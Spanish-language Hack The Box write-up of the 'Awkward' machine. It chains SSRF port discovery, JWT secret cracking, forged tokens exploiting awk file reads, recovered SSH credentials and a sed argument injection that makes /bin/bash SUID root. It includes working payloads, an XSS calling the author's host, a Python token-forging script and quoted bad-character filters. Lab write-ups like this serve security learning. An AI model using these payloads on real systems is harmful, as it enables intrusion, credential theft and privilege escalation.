---
layout: single
title: Awkward - Hack The Box
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-smasher/smasher.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - binary exploit  
---

![](/assets/images/htb-awkward/awkward1.png)

-----------------------
# Akward - 10.10.11.185 

Disclaimer: En partes de esta maquina he tenido que tirar de Writeups porque mas que media ha sido bastante hard.

## Part 1:Enumeracion

Puertos abiertos 22,80:
```console
└─$ whatweb http://10.10.11.185 HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], Meta-Refresh-Redirect[http://hat-valley.htb]
```
Añadimos hat-valley al etc-hosts.
La web parece una tienda de sombreros que está en el inicio de su desarollo. Hay una seccion de "Nuestro equipo"
con nombres interesantes que añadir a un fichero de usauriarios (para futuros ataques)

![](/assets/images/htb-awkward/awkward2.png)

El codigo fuente nos revela que estamos ante un "jquery 3.0.0"
```console
└─$ cat main.js | grep -oP '"(.*?)"' | grep "/" | sort -u | grep -v "css"
```
Encontramos app.js que tiene mas rutas, todas bajo "/src" (supongo que seran dentro del sistema)

```
└─$ wfuzz -t 200 --hl=54 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 'http://hat-valley.htb/FUZZ/'
# Nada
└─$ wfuzz -t 200 --hl=54 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 'http://hat-valley.htb/FUZZ.js'
# Nada
└─$ wfuzz -c --hl=8 -w $(locate subdomains-top1million-5000.txt) -H "Host: FUZZ.hat-valley.htb" -u http://hat-valley.htb/ -t 100
000000081:   401        7 L      12 W       188 Ch      "store"
```

Store es un nginx 1.18.0 pero que nos pide credenciales que no tenemos para acceder.
```console
└─$ wfuzz -t 200 --hl=54 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 'http://store.hat-valley.htb/FUZZ/'
000000027:   403        7 L      10 W       162 Ch      "img"
000000257:   403        7 L      10 W       162 Ch      "static"
000000399:   403        7 L      10 W       162 Ch      "cart"
000045228:   401        7 L      12 W       188 Ch      "http://store.hat-valley.htb//"
```
-----------------------------------------
## Part 2: Encontrando rutas ocultas

```console
└─$ curl -s http://hat-valley.htb/js/app.js > app.js
└─$ cat app.js | js-beautify | sed 's/\\n/\n/g' | sponge app.js
└─$ cat app.js | grep "href"
# encontramos la ruta ->  href: \"/hr\",
```
La ruta "hr" tiene contenido, un panel de login.
En la seccion de cookies (click derecho/inspect element/storage) hay un token cuyo valor es guest. 

![](/assets/images/htb-awkward/awkward3.png)

Si lo cambiamos a "admin"
En la seccion "leave" nos dice que lo que pongamos lo vera la tal Christine
Intentamos un XSS:
```
POST /api/submit-leave HTTP/1.1
Host: hat-valley.htb
Referer: http://hat-valley.htb/leave
Cookie: token=admin
{"reason":"<script src='http://10.10.14.7/script.js'>",
"start":"<script src='http://10.10.14.7/script.js'>",
"end":"<script src='http://10.10.14.7/script.js'>"}
```
Pero no recibimos ninguna respuesta con ```sudo python3 -m http.server 80;``` sino que da error.

Aun asi tenemos la ruta "api". Si hacemos una peticion POST
```console
└─$ curl -s -X POST http://hat-valley.htb/api/submit-leave # Invalid user
└─$ curl -s -X POST http://hat-valley.htb/api/submit-leave -H "Content-Type: application/json"  -d '{"user":"Crhistine"}'
Invalid user
```
![](/assets/images/htb-awkward/awkward4.png)

Si en network filtramos por api y toqueteamos dentro de hr
```
/api/all-leave
/api/submit-leave
/api/staff-details
/api/store-status -> http://hat-valley.htb/api/store-status?url="http://store.hat-valley.htb"
```
-------------------------------------------------------------
## Part 3: SSRF

Explotamos mas la ruta **/api/store-status**
```console
└─$ curl -s 'http://hat-valley.htb/api/store-status?url="http://10.10.14.7"' 
# Peticion get con -> sudo python3 -m http.server 80;
└─$ curl -s 'http://hat-valley.htb/api/store-status?url="http://store.hat.valley.htb"' # se queda pillado
└─$ curl -s 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:80"' -i | grep "Content-Length:"
Content-Length: 132                                                                                               └─$ curl -s 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:81"' -i | grep "Content-Length:"
Content-Length: 0
```
Probamos con un internal port discovery:
```console
└─$ wfuzz -t 200 --hh=0 -z range,0000-9999 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"'
000000081:   200        8 L      13 W       132 Ch      "0080"
000003003:   200        685 L    5834 W     77002 Ch    "3002"
000008081:   200        54 L     163 W      2881 Ch     "8080"
```

La web del puerto 80 es la de hat-valley. La del 8080 tiene el mismo codigo js. Lo interesante es la del puerto 3002 Como el codigo es muy largo 
lo ideal es volcarlo en un index.html y verlo haciendo un servidor en el localhost.
```console
└─$ curl -s 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:3002"' > index.html;
```
![](/assets/images/htb-awkward/awkward5.png)

De entre todo el codigo encontramos:
```
app.get('/api/all-leave', (req, res) => {
    const user_token = req.cookies.token
    if(user_token) { const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if { user = decodedToken.username }}
    const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]
    const badInUser = bad.some(char => user.includes(char));
    if(badInUser) { return res.status(500).send("Bad character detected.") } else {
        exec("awk '/" + user + "/' /var/www/private/leave_requests.csv"...
```

Segun esto la cookie tiene el campo username y de ahi saca el usaurio y se lo pasa al comando awk de bash.
Pero pasa evitar "SO command inyection" filtra caracteres especiales como la ";" AWK es un comando para filtrar cosas en un archivo.

```console
└─$ echo "cucuxii123 456" > prueba # Prueba equivale al "/var/www/private/leave_requests.csv"
└─$ awk '/cucuxii/' ./prueba   # -> cucuxii123 456
└─$ awk /etc/passwd ./prueba # cucuxii123 456
└─$ awk // cucuxii ./prueba  # No existe el archivo "cucuxii"
└─$ awk /etc/passwd ./prueba   # queda como "awk '//etc/passwd/' ./prueba" -> error

# Hay que quitar las dos comas que nos pone al principio y final con los "'"
└─$ awk '/' /etc/passwd '/' ./prueba # -> error
└─$ awk '//' /etc/passwd '/' ./prueba  # -> todo el /etc/passwd
```
Por tanto el username tiene que ser ```/' /etc/passwd '``` Pero sin el secreto no podemos crear cookies.

--------------------------------------------
## Part 4: Consiguiendo la llave la cookie

```console
└─$ curl -s 'http://hat-valley.htb/api/staff-details' | jq 
  { "username": "christine.wool",
    "password": "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",},
  { "username": "christopher.jones",
    "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",},
  { "username": "jackson.lightheart",
    "password": "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",},
  { "username": "bean.hill",
    "password": "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",}
```
Los pasamos al crackstation (sha256)
Solo conseguimos romper el de Crhis Jones  ("e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",)
Que queda en "chris123"

Pero no sirven para store.hat-valley.htb ```curl -s http://store.hat-valley.htb -u "christopher.jones:chris123"```
Pero en la pagina de hr si haces logout y te vuelves a conectar como el tio este ya entras.

Su cookie es:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1NjgwNDcwfQ.1lRSAkmfilspBEASNzPB8qnd1QomSFaDdCvWwAro9iw
```

Sacamos el secreto para crear cookies...
```console
└─$ ./jwt2john.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c..." > hash
└─$ john -w=/usr/share/wordlists/rockyou.txt hash  # 123beany123      (?)
```

--------------------------------------------
## Part 5: LFI mediante la cookie

Si en jwt.io cogemos la cookie de Christofer y le modificamos el user a ```/' /etc/passwd '```
```console
└─$ curl -s http://hat-valley.htb/api/all-leave -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6Ikp"
christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes

└─$ curl -s http://hat-valley.htb/api/all-leave -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
root:x:0:0:root:/root:/bin/bash
```
![](/assets/images/htb-awkward/awkward6.png)

Como hacer cada cookie manualmente con el jwt.io es un poco rollo, mejor hacer un script en python que lo 
automatize todo.
```python
import jwt, requests

paths = ["/etc/passwd", "/proc/net/tcp", "/etc/hostname", "/etc/hosts", "/etc/crontab"]
for path in paths:
    cookie = jwt.encode({"username": "/' " + path + " '", "iat": 1677407978}, "123beany123", algorithm="HS256")
    req = requests.get("http://hat-valley.htb/api/all-leave",cookies={"token":cookie})
    print(req.text)
```
Los usaurios del sisteam son: bean y christine aparte de root.
El output de la ruta /proc/net/tcp lo he metido en el archivo ports para tratarlo.
```console
└─$ for port in $(cat ./ports | awk '{print $2}' | awk '{print $2}' FS=":" | sort -u); do echo "$((16#$port))" | tr "\n" "," | sed "s/,/, /g" ; done
22, 25, 53, 80, 3002, 3306, 8080, 33060, 39518, 39534, 42542, 48484, 56174, 56190,  
```
Como no he encontrando nada mas interesante busco por los archivos de cada usaurio (bean y christine):
- /home/usaurio/.ssh/id_rsa -> de ninguno  
- /home/usaurio/.bashrc | grep -E "\.py|\.sh|\.c|\.php" -> alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

Si pillamos este script:
```bash
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp   # Crea la carpeta backup_tmp en Documents
cd /home/bean	# Se mete en el directorio de bean
tar --exclude='.npm','.cache','.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz . # comprime todo en bean_backup.tar.gz (excluyendo npm cache y vscode)
date > /home/bean/Documents/backup_tmp/time.txt # Escribe la fecha en /backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp # Se va a backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz . # lo comprime todo otra vez en backup/bean_backup_final.tar.gz
rm -r /home/bean/Documents/backup_tmp # emlimina el backup
```
Queremos obtener ese archivo /home/bean/Documents/backup/bean_backup_final.tar.gz. Lo puse en la ruta del script
pero no salia bien, asi que lo he hecho de otra manera.

```python3
import jwt, requests
cookie = jwt.encode({"username": "/' /home/bean/Documents/backup/bean_backup_final.tar.gz '", "iat": 1677407978}, "123beany123", algorithm="HS256")
print(cookie)
```
```console
└─$ curl http://hat-valley.htb/api/all-leave -H "Cookie: token=$(python3 cookie.py)" -o bean_backup_final.tar.gz
└─$ 7z x bean_backup_final.tar.gz 
└─$ 7z x bean_backup_final.tar
└─$ 7z x bean_backup.tar.gz
└─$ 7z x bean_backup.tar
```
Nos ha desplegado una copia de todo el home de este usaurio, solo que con muchas carpetas vacias, para eliminarlas
y quitarnoslas de encima ```for i in $(ls .); do rmdir $i 2>/dev/null; done;``` ya que rdmir solo se plica sobre 
directorios vacios. Queremos encontrar credenciales en ese mar de archivos.
```console
└─$ grep -rIE "password|pass|bean"
.config/xpad/content-DS1ZS1:bean.hill
.config/xpad/content-DS1ZS1:014mrbeanrules!#P
```
```console
└─$ sshpass -p '014mrbeanrules!#P' ssh bean@10.10.11.185
```
--------------------------------------------
## Part 6: Explotacion de script php en el subdominio

Corremos mi [script de reconocimiento](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh), basicamente no encontramos nada
interesante salvo que en esta ruta "/etc/nginx/conf.d/.htpasswd" encuentra las creds "admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1".
Pero no hay manera de romperlas. Aun asi tenemos las de antes 'bean.hill:014mrbeanrules!#P' que probamos a ver si nos sirven en store.

![](/assets/images/htb-awkward/awkward7.png)

```console
└─$ curl -s http://store.hat-valley.htb/ -u 'bean:014mrbeanrules!#P'
└─$ curl -s http://store.hat-valley.htb/ -u 'bean.hill:014mrbeanrules!#P'
└─$ curl -s http://store.hat-valley.htb/ -u 'admin:014mrbeanrules!#P' # esta si
```

En /var/www/html/store encontramos un README.txt entre otros archivos.
- No tienen la SQL preparada todavia.
- Falta implementer muchas coas.
- Los items que un usaurio meta en la carte se pondran dentro de /cart y su UserID

Tenemos muchos archivos en php, queremos encontrar alguna vulnerabilidad de OS command:
```console
bash-5.1$ for file in $(ls | grep ".php"); do echo "[*] > $file"; cat $file | grep -E "system|exec"; done
[*] > cart_actions.php
        system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
```
Esa parte pertenece a:
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST[
user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); 
    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;}}

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) { echo "Bad character detected!";exit;}}

    if(checkValidItem("/var/www/store/cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' /var/www/store/cart/{$user_id}");
        echo "Item removed from cart";}
    else { echo "Invalid item"; } exit;}
```

Podriamos intentar explotar este comando sed. Pero antes vamos a ver como funciona esta web de tienda.
Es una web en produccion por lo que está en sus primeras fases de creación.

En la web, si escojo un item y le doy a "añadir a la carta" se tramita esta peticion:
```/POST http://store.hat-valley.htb/cart_actions.php item=1&user=5315-735b-5b5-8ce2&action=add_item```

![](/assets/images/htb-awkward/awkward8.png)


No tiene sentido hacer SQLi porque nos habian avisado que no existe tal. 
Tampoco intentaremos hacer muchas inyecciones por el tema "badchars".
Vamos a ver que hay en la carpeta cart (var/www/store/cart)
```console
bash-5.1$ ls cart # 5315-735b-5b5-8ce2  -> UserId 
bash-5.1$ cat cart/5315-735b-5b5-8ce2
***Hat Valley Cart***
item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
```
En la seccion de "mi carta" podemos quitar articulos:
```/POST http://store.hat-valley.htb/cart_actions.php item=1&user=5315-735b-5b5-8ce2&action=delete_item```

Lo que hace el codigo es borrar esa linea donde sale el id de nuestro producto del archivo 5315-735b-5b5-8ce2
Por ejemplo si teniamos el item numero 2 ```sed -i '/item_id=2/d' /var/www/store/cart/5315-735b-5b5-8ce2```
borra la linea donde salga "item_id=2".
¿Pero como podemos abusar de este "sed"? Tiramos de la web [gtfobins](https://gtfobins.github.io/gtfobins/sed/)
La shell es ```sed -n '1e exec sh 1>&0' /etc/hosts``` pero no se puede por los caracteres ">" y "$".

Otra manera alternativa es el parametro -e o --expression que se sirve de un script que ejecutar.
```
# Creamos el script /tmp/shell.sh
bash-5.1$ echo '#!/bin/bash' > /tmp/shell.sh
bash-5.1$ echo 'chmod u+s /bin/bash' >> /tmp/shell.sh
bash-5.1$ chmod +x /tmp/shell.sh

# Sustituimos el archivo de la lista por un modificado con el comando:
# ```(sed) -e "1e /tmp/shell.sh" /tmp/shell.sh``` Cerrando y abriendo las comillas simples.
bash-5.1$ ls cart # 5315-735b-5b5-8ce2
bash-5.1$ rm -rf 5315-735b-5b5-8ce2 
bash-5.1$ echo '***Hat Valley Cart***' > cart/5315-735b-5b5-8ce2
bash-5.1$ echo 'item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90' >> cart/5315-735b-5b5-8ce2
```
Ahora ejecutamos la accion de delete-item para que nuestro codigo se ejecute:
```console
└─$ curl -s -x POST http://store.hat-valley.htb/cart_actions.php -d $'item=1\' -e" 1e /tmp/shell.sh" /tmp/shell.sh \'&user=5315-735b-5b5-8ce2&action=delete_item'
bash-5.1$ ls -la /bin/bash # -rwsr-sr-x 1 root root 1396520 Jan  7  2022 /bin/bash
bash-5.1$ bash -p
bash-5.1# whoami # root
```